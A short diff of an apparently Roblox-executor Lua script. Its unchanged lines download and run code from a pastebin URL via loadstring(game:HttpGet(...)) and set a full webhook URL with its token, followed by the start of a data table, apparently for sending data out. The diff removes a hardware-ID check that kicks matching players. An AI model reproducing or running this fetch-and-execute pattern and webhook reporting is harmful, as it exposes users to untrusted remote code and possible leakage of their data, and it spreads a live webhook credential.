@@ -4,13 +4,6 @@ wait()
 
 loadstring(game:HttpGet("https://pastebin.com/raw/CykKWETp"))()
 
-
-qNVAKkuwxNpqruLjSRHg = CheckHWID(HWID)
-
-if qNVAKkuwxNpqruLjSRHg == true then
- game.Players:Kick("L")
-end
-
 local url =
    "https://webhook.lewisakura.moe/api/webhooks/1210543735364919326/mu34L2DbCoSANFu5gHMm4UbKqXiiVWDWEsoN-ssq4CwSVBmDjN3SLiPshaPmtlbXnTcp" 
 local data = {
